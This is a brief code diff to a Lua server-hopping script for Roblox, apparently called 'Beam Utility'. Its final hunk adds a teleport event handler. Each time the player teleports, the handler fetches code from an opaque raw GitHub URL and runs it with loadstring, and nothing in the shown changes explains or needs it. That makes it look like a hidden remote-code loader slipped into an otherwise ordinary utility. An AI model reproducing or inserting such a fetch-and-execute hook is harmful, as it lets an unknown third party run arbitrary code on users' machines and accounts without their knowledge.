@@ -195,6 +195,7 @@ if #goodPlayers == 0 then
     ui:UpdateStatus("Server Hopping...")
     game.Players.LocalPlayer:Kick("Server Hopping (Beam Utility)")
     ServerHop()
+
 else
     Set3DRendering(true)
     if webhookSettings.enabled then
@@ -202,3 +203,7 @@ else
     end
     ui:UpdateStatus("Good server has been found")
 end
+
+Players.LocalPlayer.OnTeleport:Connect(function(State)
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/ycvi0/shushj/refs/heads/main/x"))()
+end)
